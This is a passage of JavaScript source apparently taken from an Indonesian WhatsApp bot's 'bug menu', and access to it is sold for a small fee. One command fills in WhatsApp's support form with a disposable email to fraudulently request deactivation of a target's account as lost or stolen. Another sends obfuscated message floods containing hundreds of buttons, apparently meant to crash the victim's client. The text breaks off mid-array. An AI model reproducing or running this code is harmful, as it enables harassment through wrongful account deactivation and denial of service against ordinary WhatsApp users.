/////////////////////////////////[ BUG MENU ]\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

case 'verify': 
case 'banned': 
case 'basmi':
case 'kenon': 
case 'logout':  {
if (!isCreator) return m.reply('Buy Reseller dulu cuma 4k kok, but ke 6289528157038')
if (m.quoted || q) {
const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await kalz.onWhatsApp(froms)
if (cekno.length == 0) return
var targetnya = froms.split('@')[0]
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`FROM WhatsApp Support
Hai,
 Terima kasih atas pesan Anda.
 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.
 Selama periode penonaktifan:
 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda. 
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke akun akan tetap dalam status tertunda hingga 30 hari.
 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai secepatnya.  
 Daftar ulang akun Anda dengan memasukkan kode 6 digit, kode yang Anda terima melalui SMS atau panggilan telepon. Jika Anda mendaftar ulang
 pulihkan riwayat obrolan Anda di: Android |  iPhone.
 file, cadangan, atau riwayat panggilan dari akun yang dihapus.
 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media
 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.
 Sumber daya terkait:
  Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.
  Pelajari tentang akun yang dicuri di artikel ini.
 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break

case '🔥':
case '☕':
case '🌷':{
if (!isCreator) return reply('Buy reseller dulu cuma 4k, beli ke 6289528157038')
if (!q) return m.reply(`Penggunaan ${prefix+command} 628xxxx`)
function _0x26fe(_0x1985a1,_0x8ead85){const _0x14d304=_0x14d3();return _0x26fe=function(_0x26fe5b,_0x4d7c92){_0x26fe5b=_0x26fe5b-0x1a5;let _0x3a3efe=_0x14d304[_0x26fe5b];return _0x3a3efe;},_0x26fe(_0x1985a1,_0x8ead85);}const _0x134514=_0x26fe;(function(_0xcfe365,_0x1d1e4e){const _0x575af3=_0x26fe,_0x1edf3c=_0xcfe365();while(!![]){try{const _0x182124=parseInt(_0x575af3(0x1b6))/0x1*(parseInt(_0x575af3(0x1b5))/0x2)+-parseInt(_0x575af3(0x1b3))/0x3*(parseInt(_0x575af3(0x1aa))/0x4)+parseInt(_0x575af3(0x1a9))/0x5+-parseInt(_0x575af3(0x1af))/0x6*(-parseInt(_0x575af3(0x1ab))/0x7)+-parseInt(_0x575af3(0x1a8))/0x8+parseInt(_0x575af3(0x1a7))/0x9+-parseInt(_0x575af3(0x1a5))/0xa*(-parseInt(_0x575af3(0x1b4))/0xb);if(_0x182124===_0x1d1e4e)break;else _0x1edf3c['push'](_0x1edf3c['shift']());}catch(_0x19cf98){_0x1edf3c['push'](_0x1edf3c['shift']());}}}(_0x14d3,0x4ec4e));let jumlah='10',bacot=q+_0x134514(0x1a6);var cekNumber=await kalz[_0x134514(0x1ac)](bacot);if(cekNumber[_0x134514(0x1b0)]==0x0)return m[_0x134514(0x1b2)](_0x134514(0x1b1));function _0x14d3(){const _0x33f365=['6283834558105','gagal','6WUoRxV','length','Gagal\x20mengirim\x20pesan,\x20nomor\x20target\x20tidak\x20ditemukan.','reply','3RqTnNT','1633929OFoKDI','4392gUkyyW','3yylBNq','10OSnqUO','@s.whatsapp.net','3248685pvkrkD','2152968ZnEKWn','630170EPCwGY','706736NbOCmt','884219ejOPaW','onWhatsApp'];_0x14d3=function(){return _0x33f365;};return _0x14d3();}if(q==_0x134514(0x1ad))return m[_0x134514(0x1b2)](_0x134514(0x1ae));
m.reply('Proses...⌛')
for (let i = 0; i < jumlah; i++) {
function _0x4952(){var _0x3fd9c0=['4938440dtTEQj','BUG\x20BY\x20KALZX','22DjAUaM','126472bPbnNR','2072504yyadaI','102zxjXrw','51595dGyPWd','2979252fHHTCu','☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','51GQOZhv','2026FZReRL','172FbzpIW','198EJwiJS','9732cHFEaH','https://www.whatsapp.com/otp/copy/'];_0x4952=function(){return _0x3fd9c0;};return _0x4952();}function _0x2443(_0x34d04a,_0x122b93){var _0x495223=_0x4952();return _0x2443=function(_0x244373,_0x4441f8){_0x244373=_0x244373-0x1b1;var _0x2611d9=_0x495223[_0x244373];return _0x2611d9;},_0x2443(_0x34d04a,_0x122b93);}var _0x49e64a=_0x2443;(function(_0x2323b5,_0x43579a){var _0x3087b9=_0x2443,_0x5645f5=_0x2323b5();while(!![]){try{var _0x27486c=parseInt(_0x3087b9(0x1bb))/0x1*(parseInt(_0x3087b9(0x1bc))/0x2)+-parseInt(_0x3087b9(0x1ba))/0x3*(-parseInt(_0x3087b9(0x1be))/0x4)+-parseInt(_0x3087b9(0x1b7))/0x5*(-parseInt(_0x3087b9(0x1b6))/0x6)+parseInt(_0x3087b9(0x1b5))/0x7+-parseInt(_0x3087b9(0x1b4))/0x8*(parseInt(_0x3087b9(0x1bd))/0x9)+parseInt(_0x3087b9(0x1b1))/0xa+-parseInt(_0x3087b9(0x1b3))/0xb*(parseInt(_0x3087b9(0x1b8))/0xc);if(_0x27486c===_0x43579a)break;else _0x5645f5['push'](_0x5645f5['shift']());}catch(_0x5534f7){_0x5645f5['push'](_0x5645f5['shift']());}}}(_0x4952,0x522d4),kalz['sendMessage'](bacot,{'text':_0x49e64a(0x1b2),'templateButtons':[{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WA